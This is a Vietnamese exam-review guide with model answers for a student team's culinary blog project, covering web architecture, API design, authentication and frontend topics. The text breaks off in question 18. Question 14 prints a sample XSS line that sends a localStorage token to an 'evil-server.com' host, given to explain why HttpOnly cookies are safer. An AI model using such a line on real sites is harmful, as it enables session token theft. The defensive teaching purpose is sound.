# BỘ TÀI LIỆU ÔN TẬP VÀ ĐÁP ÁN BẢO VỆ CUỐI KỲ
## ĐỒ ÁN: BLOG ẨM THỰC VÀ NẤU ĂN (CULINARY BLOG) — NHÓM 25
**Môn học:** Phát triển Ứng dụng Web Nâng cao (PTUDWNC)  
**Giảng viên hướng dẫn:** TS. Nguyễn Thị Lương  
**Thành viên thực hiện:**
1. **Nguyễn Hoài Nam** (Trưởng nhóm - 2312607 / 2312694): Team Lead, Backend Core, Auth & Recipe Modules, DevOps & Docker
2. **Đỗ Duy Biên** (2312584): Backend Categories, Search FTS, MinIO Storage & Background Jobs
3. **Hoàng Thăng Long** (2312676): Frontend Public Web, Recipe Catalog, SEO & Auth UI
4. **Trần Chánh Phát** (2212437): Frontend Creator Dashboard, Recipe Editor & Admin Management

---

# PHẦN I – LÝ THUYẾT (20 CÂU HỎI TRỌNG TÂM)

### Câu 1: Phân tích ưu và nhược điểm của Monolithic Architecture. Trong trường hợp nào bạn vẫn nên chọn Monolithic cho một dự án mới?
* **Ưu điểm:**
  - **Đơn giản trong phát triển và debug:** Toàn bộ code nằm chung một repository, dễ dàng trace luồng gọi hàm từ controller qua service đến database mà không cần network call phức tạp.
  - **Dễ triển khai (Deployment):** Chỉ cần đóng gói 1 artifact duy nhất (1 Docker image hoặc 1 binary) và deploy lên server.
  - **Hiệu năng cao trong giao tiếp nội bộ:** Các module gọi trực tiếp in-memory function call thay vì tốn overhead serialize/deserialize dữ liệu qua HTTP/gRPC giữa các microservices.
  - **Tính toàn vẹn dữ liệu (ACID Transactions):** Dễ dàng quản lý transaction trên cùng một CSDL quan hệ (PostgreSQL) thông qua Unit of Work, không gặp bài toán phân tán dữ liệu phức tạp (2PC hay Saga pattern).
* **Nhược điểm:**
  - **Khó mở rộng quy mô độc lập (Scalability):** Khi một chức năng (như Search FTS hoặc Video/Image processing) bị quá tải, phải scale toàn bộ ứng dụng Monolith thay vì scale riêng module đó.
  - **Mức độ phụ thuộc cao (Tight Coupling):** Lỗi crash ở một module có thể kéo sập toàn bộ process của hệ thống.
  - **Rào cản công nghệ:** Toàn bộ hệ thống bị bó hẹp trong một framework/runtime chính.
* **Trường hợp nên chọn Monolithic cho dự án mới:**
  - Dự án mới khởi động (MVP - Minimum Viable Product), yêu cầu Time-to-Market ngắn, domain nghiệp vụ chưa ổn định hoặc chưa quá phức tạp.
  - Quy mô đội ngũ nhỏ đến trung bình (3 - 8 người), việc chia microservices sẽ gây lãng phí tài nguyên vận hành (DevOps overhead, monitoring, network latency, distributed logging).
  - Dự án như **Culinary Blog** sử dụng kiến trúc **Modular Monolith** kết hợp **Clean Architecture**: vừa đảm bảo phân tách ranh giới nghiệp vụ rõ ràng, vừa tối ưu hóa chi phí vận hành và tốc độ phát triển.

---

### Câu 2: Giải thích Dependency Rule trong Clean Architecture. Tại sao Application Layer không được import trực tiếp từ Infrastructure Layer? Điều gì xảy ra nếu vi phạm quy tắc này?
* **Quy tắc phụ thuộc (Dependency Rule):**
  - Trong Clean Architecture, các tầng được sắp xếp theo hình tròn đồng tâm (hoặc tầng xếp chồng). **Quy tắc cốt lõi: Chiều phụ thuộc của mã nguồn CHỈ ĐƯỢC PHÉP hướng từ ngoài vào trong.**
  - `Domain (Core)` $\leftarrow$ `Application (Use Cases)` $\leftarrow$ `Infrastructure / Presentation (API, Web, DB, MinIO)`.
* **Tại sao Application Layer không được import Infrastructure Layer?**
  - Tầng Application chứa logic nghiệp vụ thuần túy (Use Cases). Nó không được phụ thuộc vào công nghệ triển khai bên ngoài (PostgreSQL, Redis, MinIO, SendGrid, EF Core / SQLAlchemy).
  - Để tương tác với database hay bên thứ ba, Application Layer chỉ định nghĩa các **Interface / Port** (như `IRecipeRepository`, `IStorageService`, `IEmailSender`). Tầng Infrastructure đóng vai trò là **Adapter**, triển khai (`implement`) các interface này.
  - Đây là ứng dụng nguyên lý **Dependency Inversion Principle (DIP)** trong SOLID.
* **Điều gì xảy ra nếu vi phạm quy tắc này?**
  - **Mất tính linh hoạt (Tight Coupling):** Nghiệp vụ bị "trói chặt" vào framework, ORM hoặc công nghệ cụ thể. Nếu muốn đổi database từ PostgreSQL sang MySQL, hoặc đổi storage từ MinIO sang AWS S3, ta phải sửa lại mã nghiệp vụ.
  - **Khó viết Unit Test:** Không thể mock hay stub các dependency external khi viết test cho Use Case, dẫn đến phải chạy integration test kết nối database thật, làm test chạy chậm và dễ bị flaky.

---

### Câu 3: Trong RESTful API design, khi nào nên dùng PUT và khi nào nên dùng PATCH? Hãy đưa ra ví dụ cụ thể trong context của Culinary Blog.
* **PUT (Idempotent, Full Replacement):**
  - Dùng khi client muốn **thay thế toàn bộ** tài nguyên bằng payload mới. Nếu client thiếu trường nào trong request body, trường đó sẽ bị ghi đè thành null/default.
  - **Ví dụ trong Culinary Blog:**
    - `PUT /api/v1/recipes/{id}`: Cập nhật toàn bộ công thức gồm `title`, `description`, `prepTime`, `cookTime`, `servings`, `difficulty`, `nutrition`. Client phải gửi toàn bộ đối tượng hoàn chỉnh để ghi đè trạng thái cũ.
* **PATCH (Non-Idempotent / Idempotent, Partial Update):**
  - Dùng khi client chỉ muốn **cập nhật một phần** (một hoặc một vài trường) của tài nguyên, các trường còn lại giữ nguyên giá trị cũ.
  - **Ví dụ trong Culinary Blog:**
    - `PATCH /api/v1/auth/me`: Cập nhật thông tin tác giả cá nhân (chỉ đổi `fullName`, `bio` hoặc `avatarUrl` mà không bắt buộc gửi lại toàn bộ thông tin tài khoản).
    - `PATCH /api/v1/recipes/{id}/status`: Chỉ thay đổi trạng thái công thức (ví dụ từ `Draft` sang `Published`) mà không tác động tới nội dung bài viết.

---

### Câu 4: Cursor-based pagination có ưu điểm gì so với Offset-based pagination? Ứng dụng Culinary Blog của bạn đã sử dụng kỹ thuật nào? Giải thích lý do lựa chọn giải pháp đó.
* **Ưu điểm của Cursor-based so với Offset-based:**
  - **Hiệu năng vượt trội trên tập dữ liệu lớn:** Offset-based dùng `OFFSET N LIMIT M`, CSDL phải quét qua $N$ bản ghi đầu tiên rồi mới lấy $M$ bản ghi (độ phức tạp $O(N)$). Cursor-based dùng con trỏ indexed (ví dụ `WHERE id < last_id AND created_at < last_created_at ORDER BY created_at DESC LIMIT M`) tận dụng index B-Tree trực tiếp, đạt độ phức tạp $O(1)$.
  - **Không bị lỗi trùng hoặc sót dữ liệu (No Page Drift):** Trong Offset, nếu người dùng mới vừa đăng thêm bài viết trong lúc user đang duyệt ở trang 1, khi chuyển sang trang 2, bản ghi cuối cùng của trang 1 sẽ bị đẩy sang trang 2 khiến user thấy bài viết bị trùng lặp. Cursor-based cố định vị trí theo mốc thời gian/ID nên không bị hiện tượng này.
* **Ứng dụng Culinary Blog sử dụng kỹ thuật nào?**
  - Dự án Culinary Blog sử dụng **Offset-based pagination** (tham số query: `page=1&pageSize=12`).
* **Lý do lựa chọn giải pháp đó:**
  - **Phù hợp với UI Catalog truyền thống:** Giao diện web công khai và trang quản trị Dashboard của tác giả yêu cầu hiển thị thanh chuyển trang số cụ thể (`Trang 1, 2, 3... 10`, nút chuyển nhanh đến trang cuối) và tính toán tổng số trang (`totalPages = ceil(totalCount / pageSize)`). Cursor-based rất khó/không hỗ trợ nhảy cóc tới số trang bất kỳ mà chỉ hỗ trợ cuộn vô tận (Infinite Scroll) hoặc "Xem tiếp".
  - **Quy mô dữ liệu blog ẩm thực:** Số lượng bài viết của một blog nấu ăn thường nằm trong khoảng hàng nghìn đến hàng chục nghìn bài, trên PostgreSQL có đánh B-tree index cho các cột filter (`category_id`, `difficulty`, `created_at`) thì `OFFSET` ở các trang đầu phản hồi cực nhanh (< 20ms).

---

### Câu 5: Giải thích tại sao DTO (Data Transfer Object) quan trọng trong Clean Architecture. Điều gì xảy ra nếu bạn trả về Entity trực tiếp từ API endpoint?
* **Tầm quan trọng của DTO:**
  - **Tách biệt tầng biểu diễn (API Contract) và tầng lưu trữ (Database Schema):** Cấu trúc bảng CSDL có thể thay đổi để tối ưu hóa truy vấn mà không làm "vỡ" API format trả về cho Frontend / Mobile.
  - **Ẩn giấu dữ liệu nhạy cảm (Information Hiding):** Entity `User` chứa `password_hash`, `access_failed_count`, `lockout_end`. DTO `UserDto` chỉ chọn lọc hiển thị `id`, `fullName`, `userName`, `avatarUrl`, `bio`, `role`.
  - **Tối ưu hóa băng thông (Payload Optimization):** DTO loại bỏ các thuộc tính không cần thiết hoặc nén các quan hệ phức tạp thành summary data.
  - **Ngăn chặn tấn công Mass Assignment:** Khi nhận dữ liệu, DTO kiểm soát chặt các trường được phép nhập (ví dụ không cho phép client tự gửi `role: "Admin"` trong `RegisterRequestDto`).
* **Điều gì xảy ra nếu trả về Entity trực tiếp?**
  - **Rò rỉ dữ liệu nhạy cảm (Security Vulnerability):** Lộ mật khẩu hash, token, cờ quản trị nội bộ ra ngoài internet.
  - **Vòng lặp tuần hoàn (Circular Reference / Infinite Serialization):** Trong ORM có quan hệ 2 chiều (`Recipe` trỏ tới `User`, `User` chứa danh sách `Recipe`), bộ serializer (JSON encoder) sẽ lặp vô hạn gây lỗi `StackOverflowException` hoặc đơ server.
  - **N+1 Query & Lazy Loading exception:** Khi serialize Entity có lazy-loaded relationships bên ngoài phạm vi database session, ORM sẽ ném lỗi session closed hoặc tự động kích hoạt hàng chục câu query phụ làm sập hiệu năng.

---

### Câu 6: Phân biệt Authentication và Authorization. Cho ví dụ: Trong Culinary Blog, hành động nào chỉ cần Authentication và hành động nào cần cả Authorization?
* **Phân biệt:**
  - **Authentication (Xác thực):** Trả lời câu hỏi **"Bạn là ai?"** (Who are you?). Đây là quá trình kiểm tra danh tính người dùng thông qua thông tin đăng nhập (Email/Password, Google OAuth2, JWT).
  - **Authorization (Phân quyền):** Trả lời câu hỏi **"Bạn có quyền làm gì trên tài nguyên này?"** (What are you allowed to do?). Đây là quá trình kiểm tra vai trò (Role-based) hoặc quyền hạn cụ thể (Resource-based permission) sau khi đã được xác thực danh tính.
* **Ví dụ trong Culinary Blog:**
  - **Hành động CHỈ CẦN Authentication:**
    - Xem thông tin cá nhân (`GET /api/v1/auth/me`). Bất kỳ người dùng nào đã đăng nhập hợp lệ (có Bearer Token) đều có quyền xem thông tin của chính mình.
    - Tạo một công thức mới ở trạng thái bản nháp (`POST /api/v1/recipes`). Mọi tài khoản có role `Author` hợp lệ đều được phép tạo mới công thức.
  - **Hành động CẦN CẢ Authorization:**
    - Tạo/Sửa/Xóa danh mục món ăn (`POST/PUT/DELETE /api/v1/categories`): Yêu cầu người dùng đã đăng nhập VÀ phải có role là `Admin` (Role-based Authorization).
    - Cập nhật hoặc Xóa một công thức cụ thể (`PUT/DELETE /api/v1/recipes/{id}`): Yêu cầu người dùng đã đăng nhập VÀ phải là chính tác giả sở hữu công thức đó (`recipe.author_id == current_user.id`) HOẶC có role `Admin` (Resource-based Authorization).

---

### Câu 7: Tại sao JWT là stateless? Ưu và nhược điểm của stateless authentication so với session-based authentication truyền thống là gì?
* **Tại sao JWT là stateless?**
  - JWT (JSON Web Token) tự chứa toàn bộ thông tin người dùng và quyền hạn (claims như `sub`, `role`, `exp`, `jti`) bên trong payload của nó, được bảo vệ bằng chữ ký mật mã (HMAC-SHA256 hoặc RSA).
  - Khi API nhận được request có Bearer token, server chỉ cần dùng khóa bí mật (`SECRET_KEY`) để verify chữ ký số và giải mã payload mà **không cần truy vấn Database hay Redis** để tìm kiếm session ID.
* **Ưu điểm của Stateless JWT:**
  - **Khả năng mở rộng ngang (Horizontal Scalability) tuyệt vời:** Backend có thể scale lên 10, 50 hay 100 instances đằng sau Load Balancer mà không cần cấu hình Sticky Sessions hay cơ chế chia sẻ session storage.
  - **Tối ưu cho Microservices & Decoupled Architecture:** Token có thể truyền qua lại giữa các dịch vụ độc lập một cách thông suốt.
* **Nhược điểm của Stateless JWT:**
  - **Khó thu hồi ngay lập tức (Hard to Revoke):** Nếu token bị lộ, nó vẫn hợp lệ cho đến khi hết hạn (`exp`). Để giải quyết, phải dùng Access Token thời hạn ngắn (15 phút) kết hợp Refresh Token lưu database/Redis.
  - **Kích thước gói tin lớn hơn:** Header `Authorization: Bearer <token>` có kích thước từ 500 bytes đến 2KB, truyền đi trong mọi HTTP request làm tăng nhẹ network overhead so với cookie session id (vài chục bytes).

---

### Câu 8: Tại sao CORS không phải là biện pháp bảo mật API? Kẻ tấn công có thể bypass CORS không? Trong trường hợp nào?
* **Tại sao CORS không phải là biện pháp bảo mật API?**
  - **CORS (Cross-Origin Resource Sharing) là cơ chế bảo mật CỦA TRÌNH DUYỆT (Browser Security Mechanism), KHÔNG PHẢI của máy chủ API.**
  - Mục đích của CORS là bảo vệ **người dùng trình duyệt** khỏi các trang web độc hại thực hiện các request cross-origin không mong muốn (thực thi mã JS độc hại để đọc lén dữ liệu từ server khác).
  - Bản thân máy chủ API vẫn nhận được request, vẫn thực thi code và truy vấn DB; trình duyệt chỉ chặn không cho JavaScript phía client đọc kết quả trả về nếu thiếu header `Access-Control-Allow-Origin`.
* **Kẻ tấn công có thể bypass CORS không?**
  - **HOÀN TOÀN CÓ THỂ, và rất dễ dàng.**
* **Trong trường hợp nào?**
  - **Sử dụng các công cụ phi trình duyệt:** Kẻ tấn công gọi API thông qua `cURL`, `Postman`, Python `requests`, Go, Node.js scripts. Các công cụ này không phải trình duyệt web, không tuân thủ Same-Origin Policy nên bỏ qua hoàn toàn cơ chế CORS.
  - **Sử dụng Reverse Proxy / Backend Middleware:** Kẻ tấn công dựng một backend proxy trung gian gửi request server-to-server tới API của bạn, sau đó trả dữ liệu về cho client.
  - **Kết luận:** Muốn bảo mật API, bắt buộc phải dùng Authentication (JWT), Authorization, Rate Limiting và Input Validation, tuyệt đối không được dựa vào CORS.

---

### Câu 9: Resource-based authorization là gì? Hãy nêu 1 ví dụ trong ứng dụng Culinary Blog và 1 ví dụ khác ngoài ứng dụng này.
* **Khái niệm:**
  - Resource-based authorization (Phân quyền dựa trên tài nguyên) là cơ chế kiểm tra quyền truy cập không chỉ dựa vào Role của người dùng (như Admin hay User), mà dựa trên **thuộc tính và trạng thái của chính tài nguyên cụ thể** mà người dùng đang thao tác.
* **Ví dụ trong Culinary Blog:**
  - Khi thực hiện sửa công thức món ăn `PUT /api/v1/recipes/{id}`:
    ```python
    def _check_recipe_ownership(recipe: Recipe, user: User) -> None:
        if user.role != "Admin" and str(recipe.author_id) != str(user.id):
            raise ForbiddenException(detail="Bạn không có quyền chỉnh sửa công thức này.")
    ```
    Hệ thống phải truy vấn thực thể `Recipe` lên, đối chiếu xem `recipe.author_id` có khớp với `user.id` của người gửi request hay không. Nếu không khớp và không phải Admin thì chặn lại bằng mã lỗi `403 Forbidden`.
* **Ví dụ ngoài ứng dụng Culinary Blog:**
  - Hệ thống **Google Drive / Dropbox**: Người dùng A và B đều có role là "Người dùng cơ bản" (Role như nhau), nhưng người dùng A chỉ được phép xóa hoặc đổi tên file nếu file đó thuộc quyền sở hữu của A hoặc A được phân quyền `Editor` trên file đó. Người dùng B không thể can thiệp vào file của A.

---

### Câu 10: Tại sao trong Clean Architecture, chúng ta cần Repository Pattern thêm vào phía trên EF Core / SQLAlchemy thay vì dùng DbContext / Session trực tiếp? Hãy giải thích từ góc độ testability và Dependency Inversion.
* **Từ góc độ Testability:**
  - `DbContext` (trong EF Core) hay `AsyncSession` (trong SQLAlchemy) là những đối tượng rất nặng, quản lý kết nối TCP/IP, transaction log, identity map. Việc mock trực tiếp `DbContext` hay `DbSet` trong unit test cực kỳ phức tạp và dễ lỗi.
  - Khi bọc qua interface `IRecipeRepository`, trong Unit Test của tầng Service/Use Case, ta chỉ cần tạo một Mock đơn giản (ví dụ dùng `unittest.mock` hoặc `Moq`):
    `mock_repo.get_by_id.return_value = fake_recipe`
    Test chạy hoàn toàn in-memory, đạt tốc độ mili-giây, không cần cài đặt CSDL thật.
* **Từ góc độ Dependency Inversion Principle (DIP):**
  - Tầng Domain/Application là trung tâm, nó không được biết đến công nghệ ORM bên dưới. Việc dùng trực tiếp `DbContext` sẽ làm rò rỉ cú pháp của ORM (LINQ, `IQueryable`, `select()`, `selectinload`) vào khắp nơi trong Use Case.
  - Repository Pattern trừu tượng hóa các thao tác dữ liệu thành các phương thức thuần túy hướng đối tượng (`add`, `get_by_id`, `list_published`), giúp tầng nghiệp vụ độc lập hoàn toàn với việc dữ liệu được lưu trong PostgreSQL, MongoDB hay in-memory.

---

### Câu 11: Unit of Work Pattern giải quyết vấn đề gì mà Repository Pattern một mình không giải quyết được? Cho ví dụ một use case cụ thể trong Culinary Blog.
* **Vấn đề Unit of Work Pattern giải quyết:**
  - Repository Pattern chỉ quản lý từng thực thể riêng rẽ (ví dụ `RecipeRepository`, `StepRepository`, `IngredientRepository`).
  - Nếu một nghiệp vụ liên quan đến việc thay đổi trên nhiều Repository khác nhau, nếu từng Repository tự gọi `commit()`, ta sẽ gặp vấn đề: **Mất tính toàn vẹn dữ liệu (Lack of Atomicity).** Nếu Repository thứ 1 commit thành công nhưng Repository thứ 2 gặp lỗi sập mạng/vi phạm ràng buộc, dữ liệu sẽ rơi vào trạng thái mâu thuẫn/rác (inconsistent state).
  - **Unit of Work** duy trì một danh sách các nghiệp vụ thay đổi (Insert, Update, Delete) trên một database transaction duy nhất. Toàn bộ thay đổi chỉ được thực thi và xác nhận (commit) một lần duy nhất. Nếu có bất kỳ bước nào lỗi, toàn bộ transaction sẽ bị rollback.
* **Ví dụ use case trong Culinary Blog:**
  - Use case **Tạo mới công thức hoàn chỉnh hoặc Xuất bản Recipe:**
    Khi người dùng tạo công thức kèm 10 bước nấu (`RecipeStep`) và 15 nguyên liệu (`RecipeIngredient`):
    1. Tạo bản ghi `Recipe` trong bảng `recipes`.
    2. Thêm 10 bản ghi vào bảng `recipe_steps`.
    3. Thêm 15 bản ghi vào bảng `recipe_ingredients`.
    Nếu quá trình thêm bước nấu số 8 bị lỗi database (ví dụ chuỗi quá dài), Unit of Work đảm bảo `rollback()` toàn bộ: bản ghi `Recipe` và 7 bước trước đó sẽ không lưu vào CSDL, tránh tạo ra công thức "rác" không có nội dung.

---

### Câu 12: Giải thích Cartesian Explosion xảy ra như thế nào khi Include nhiều collection. Với recipe có 10 steps và 15 ingredients, số rows trong kết quả SQL không dùng AsSplitQuery() là bao nhiêu? So sánh với khi dùng AsSplitQuery().
* **Hiện tượng bùng nổ tích Descartes (Cartesian Explosion):**
  - Xảy ra khi một truy vấn SQL sử dụng phép `LEFT JOIN` liên tiếp qua nhiều quan hệ 1-N (One-to-Many collections).
  - CSDL quan hệ sẽ nhân chéo các tập dữ liệu lại với nhau, tạo ra tập kết quả chứa các dòng dữ liệu bị nhân bản dữ liệu cha gấp nhiều lần qua mạng.
* **Tính toán số rows:**
  - Một `Recipe` cha có 10 `RecipeStep` và 15 `RecipeIngredient`:
  - **Khi KHÔNG dùng `AsSplitQuery()` (Single Query JOIN):**
    Số dòng SQL trả về = $1 \text{ (Recipe)} \times 10 \text{ (Steps)} \times 15 \text{ (Ingredients)} = \mathbf{150 \text{ dòng}}$.
    *(Nếu có thêm 5 ảnh `RecipeImage`, số dòng sẽ là $1 \times 10 \times 15 \times 5 = \mathbf{750 \text{ dòng}}$!)*
    Toàn bộ thông tin mô tả, tiêu đề dài của Recipe cha bị nhân bản 150 lần trong gói tin gửi từ DB về server, gây nghẽn băng thông và tốn RAM để parse.
  - **Khi DÙNG `AsSplitQuery()` (hoặc `selectinload` trong SQLAlchemy):**
    ORM sẽ tách thành các câu query SELECT riêng rẽ:
    1. `SELECT * FROM recipes WHERE id = ?` $\rightarrow$ **1 dòng**.
    2. `SELECT * FROM recipe_steps WHERE recipe_id = ?` $\rightarrow$ **10 dòng**.
    3. `SELECT * FROM recipe_ingredients WHERE recipe_id = ?` $\rightarrow$ **15 dòng**.
    Tổng số dòng trả về = $1 + 10 + 15 = \mathbf{26 \text{ dòng}}$.
* **Kết luận:** Dùng `AsSplitQuery()` / `selectinload` giảm từ 150 dòng xuống 26 dòng (giảm gần 6 lần lượng dữ liệu truyền qua network).

---

### Câu 13: Giải thích sự khác biệt cốt lõi giữa React Server Components (RSC) và Client Components về bundle size và khả năng fetch data. Trong Culinary Blog, trang/component nào nên là RSC và component nào cần "use client"?
* **Sự khác biệt cốt lõi:**
  | Tiêu chí | React Server Components (RSC) | Client Components (`"use client"`) |
  |---|---|---|
  | **Nơi thực thi** | Chỉ chạy trên Server, trả về virtual DOM stream về client. | Chạy trên trình duyệt (và được pre-render HTML trên server lúc SSR). |
  | **Bundle Size** | **Zero client bundle size**. Các thư viện nặng dùng trong RSC (date-fns, marked, slugify, prisma/orm) không bị tải về trình duyệt. | Mã nguồn component và các package phụ thuộc được đóng gói vào file `.js` tải về client. |
  | **Fetch Data** | Gọi trực tiếp CSDL hoặc microservice nội bộ với độ trễ thấp, không làm lộ API keys hay connection strings. | Phải gọi qua HTTP fetch/Axios tới các public API endpoints. |
  | **Tính tương tác** | Không dùng được React State (`useState`), Effects (`useEffect`) hoặc browser event handlers (`onClick`, `onChange`). | Đầy đủ tính tương tác, hỗ trợ State, Event listeners, Browser APIs. |
* **Ứng dụng trong Culinary Blog:**
  - **Nên là RSC:**
    - `HomePage`: Hiển thị danh sách danh mục và công thức nổi bật tĩnh.
    - `RecipeDetailPage` (khung tĩnh): Render tiêu đề, mô tả SEO, danh sách nguyên liệu, các bước nấu, thông tin dinh dưỡng và Schema.org JSON-LD để Google bot crawl nhanh nhất.
    - `Footer`: Nội dung tĩnh hoàn toàn.
  - **Cần `"use client"`:**
    - `RecipeEditorPage` & `StepAndIngredientEditor`: Có form nhập liệu, drag-and-drop kéo thả đổi thứ tự bước nấu.
    - `ImageUploader`: Xử lý preview ảnh, tiến trình upload file lên MinIO.
    - `Navbar` (khu vực User Menu): Bắt sự kiện click dropdown menu, lấy thông tin user từ `AuthContext` / `Zustand`.
    - `SearchPage` (thanh Search Bar): Bắt sự kiện gõ phím `onChange`, debounce tìm kiếm trực tiếp.

---

### Câu 14: Auth.js lưu session trong HTTP-only cookie thay vì localStorage. Giải thích tại sao đây là lựa chọn bảo mật hơn. XSS ảnh hưởng khác nhau như thế nào đến hai cách lưu trữ này? Điều gì thay đổi khi accessToken của backend được đưa vào session?
* **Tại sao HTTP-only Cookie bảo mật hơn localStorage?**
  - Cookie có cờ `HttpOnly` được trình duyệt bảo vệ nghiêm ngặt: **Mã JavaScript chạy trên trang web (kể cả mã độc) hoàn toàn KHÔNG THỂ đọc hoặc can thiệp vào cookie này qua `document.cookie`.**
  - Cookie có cờ `Secure` (chỉ gửi qua HTTPS) và `SameSite=Lax/Strict` (ngăn chặn tấn công CSRF).
* **XSS (Cross-Site Scripting) ảnh hưởng khác nhau thế nào?**
  - **Với `localStorage`:** Khi hacker chèn được một đoạn mã script XSS vào trang, chúng chỉ cần thực thi:
    `fetch('https://evil-server.com/steal?token=' + localStorage.getItem('token'))`
    $\rightarrow$ Hacker lấy được Access Token / Refresh Token vĩnh viễn và toàn quyền giả mạo người dùng từ bất kỳ máy nào trên thế giới.
  - **Với `HttpOnly Cookie`:** Khi bị dính mã độc XSS, hacker **không thể lấy cắp được token**. Kẻ tấn công chỉ có thể thực hiện các hành động âm thầm ngay trong phiên duyệt web của nạn nhân (CSRF context), nhưng không thể trích xuất token để lưu trữ sử dụng lâu dài sau khi tab đóng lại.
* **Điều gì thay đổi khi accessToken của backend được đưa vào session cookie?**
  - Phía Next.js / API Gateway đóng vai trò là Backend-For-Frontend (BFF). Trình duyệt gọi Next.js API route qua cookie, sau đó Next.js route giải mã session lấy `accessToken` gửi tiếp đến FastAPI backend.
  - Lợi ích: Backend token được giấu kín hoàn toàn khỏi client-side code, nâng mức độ an toàn của toàn bộ hệ thống lên mức cao nhất.

---

### Câu 15: Phân biệt Server State, Client State, URL State và Form State. Với mỗi loại, giải thích tại sao công cụ được đề xuất (TanStack Query, Zustand, URL params, React Hook Form) là phù hợp nhất.
1. **Server State (Dữ liệu từ máy chủ):**
   - *Đặc điểm:* Dữ liệu nằm ở backend database, client chỉ mượn bản cache tạm thời (ví dụ danh sách recipes, chi tiết công thức). Dữ liệu có thể bị cũ (stale) do người khác cập nhật.
   - *Công cụ tối ưu:* **TanStack Query (React Query)**. Tự động quản lý caching, background refetching khi focus cửa sổ, retry khi mất mạng, phân trang, deduplication requests.
2. **Client State (Trạng thái giao diện toàn cục):**
   - *Đặc điểm:* Trạng thái chỉ tồn tại trên giao diện máy khách, không lưu trữ CSDL (ví dụ: mở/đóng Sidebar modal, trạng thái Dark/Light mode, thông tin phiên đăng nhập tạm thời).
   - *Công cụ tối ưu:* **Zustand**. Nhẹ (dưới 2KB), API đơn giản, không bị boilerplate như Redux, không gây re-render thừa thãi như React Context.
3. **URL State (Trạng thái trên đường dẫn):**
   - *Đặc điểm:* Dữ liệu điều hướng như `?page=2&difficulty=1&search=ga`.
   - *Công cụ tối ưu:* **URLSearchParams / React Router hooks (`useSearchParams`)**. Giúp người dùng có thể copy link chia sẻ cho người khác hoặc bookmark lại trang kết quả tìm kiếm y hệt.
4. **Form State (Trạng thái nhập liệu):**
   - *Đặc điểm:* Dữ liệu nhập vào từng ô input, lỗi validate, trạng thái touched, dirty, isSubmitting.
   - *Công cụ tối ưu:* **React Hook Form**. Dùng Uncontrolled components với `ref`, chỉ re-render chính xác ô input đang thay đổi thay vì re-render toàn bộ form mỗi khi gõ phím như `useState`.

---

### Câu 16: Next.js `<Image>` tự động tạo các kích thước ảnh khác nhau dựa trên sizes prop. Giải thích cách browser chọn ảnh nào để hiển thị và tại sao điều này quan trọng cho Core Web Vitals. Vì sao Next.js 16 thay prop priority bằng loading/fetchPriority/preload?
* **Cách browser chọn ảnh:**
  - Component `<Image>` sinh ra thuộc tính `srcset` (danh sách các ảnh có độ phân giải khác nhau: 640w, 750w, 1080w, 1200w) kèm thuộc tính `sizes` (ví dụ: `(max-width: 768px) 100vw, 50vw`).
  - Trước khi render trang, trình duyệt tính toán kích thước khung nhìn (Viewport Width) và mật độ điểm ảnh (Device Pixel Ratio - ví dụ màn hình Retina 2x), sau đó tự động chọn đúng file ảnh có dung lượng nhỏ nhất mà vẫn sắc nét từ `srcset`.
* **Tầm quan trọng đối với Core Web Vitals:**
  - **Tối ưu chỉ số LCP (Largest Contentful Paint):** Tải ảnh đúng kích thước giúp giảm kích thước tệp tải xuống từ 2MB xuống còn 50-100KB, ảnh xuất hiện nhanh hơn, đạt điểm xanh LCP (< 2.5s).
  - **Tránh chỉ số CLS (Cumulative Layout Shift):** `<Image>` bắt buộc khai báo `width`/`height` hoặc `fill`, giúp trình duyệt dành sẵn khung trống (aspect-ratio placeholder), trang không bị giật/nhảy bố cục khi ảnh tải xong.
* **Vì sao thay `priority` bằng `loading / fetchPriority / preload`?**
  - Thuộc tính `fetchpriority="high"` là chuẩn web tiêu chuẩn của W3C được tích hợp trực tiếp vào trình duyệt (Chrome, Safari, Firefox).
  - Thay vì dùng prop trừu tượng riêng của Next.js (`priority`), việc chuyển sang `fetchPriority="high"` và `rel="preload"` giúp bộ nạp trình duyệt (Preload Scanner) ưu tiên tải ảnh LCP ngay ở mức độ mạng cấp thấp nhất, chuẩn hóa theo tiêu chuẩn web hiện đại.

---

### Câu 17: Giải thích sự khác biệt giữa Logging, Metrics và Distributed Tracing. Khi nào bạn sẽ dùng từng loại để debug một vấn đề performance trong Culinary Blog?
* **Sự khác biệt (3 trụ cột của Observability):**
  - **Logging (Nhật ký):** Ghi lại chi tiết từng sự kiện riêng lẻ xảy ra tại một thời điểm cụ thể, kèm ngữ cảnh (ví dụ: `[INFO] User 123 đăng nhập lúc 14:00`, `[ERROR] Database timeout at line 45`). Rất chi tiết nhưng chiếm nhiều dung lượng lưu trữ.
  - **Metrics (Chỉ số đo lường):** Các con số thống kê có thể tổng hợp theo thời gian (ví dụ: CPU usage = 75%, RAM = 1.2GB, HTTP 500 error rate = 0.5%, Response Time P99 = 1200ms). Nhẹ, tối ưu cho việc vẽ biểu đồ và cảnh báo (Alerting).
  - **Distributed Tracing (Vết phân tán):** Theo dõi đường đi của một request xuyên suốt qua nhiều dịch vụ/thành phần (từ Nginx $\rightarrow$ FastAPI $\rightarrow$ PostgreSQL $\rightarrow$ Redis $\rightarrow$ MinIO) thông qua một `Trace-ID` / `Correlation-ID`.
* **Kịch bản debug performance trong Culinary Blog:**
  1. *Bước 1 - Dùng Metrics:* Nhìn vào Grafana/Prometheus thấy chỉ số Response Time P95 của endpoint `GET /api/v1/recipes` tăng vọt từ 50ms lên 3000ms lúc 10h sáng.
  2. *Bước 2 - Dùng Tracing:* Lấy một request chậm cụ thể xem waterfall trace chart, phát hiện request mất 2800ms tại công đoạn kết nối CSDL PostgreSQL (DB query span), trong khi bước qua Nginx chỉ mất 2ms.
  3. *Bước 3 - Dùng Logging:* Tra cứu nhật ký log theo `X-Correlation-ID` của request đó, đọc được log cảnh báo: `Slow query detected: SELECT * FROM recipes WHERE is_deleted = false ORDER BY ...` do thiếu index trên cột sắp xếp hoặc bị khóa bảng (table lock).

---

### Câu 18: Khi xây dựng API, người ta thường định nghĩa thêm 3 endpoints: /health, /health/live, và /health/ready với logic phân tách đúng. Tại sao cần tách biệt liveness và readiness health checks? Nếu chỉ có một endpoint /health, điều gì có thể xảy ra khi database bị chậm?
* **Tại sao cần tách biệt Liveness và Readiness?**
  - **Liveness Probe (`/health/live`):** Kiểm tra xem **tiến trình ứng dụng (process) có còn sống hay không**. Nó CHỈ kiểm tra nội tại process của ứng dụng (không gọi ra ngoài DB). Nếu endpoint này chết (timeout hoặc trả 500), bộ điều phối (Kubernetes, Docker Swarm) sẽ tự động **restart lại container**.
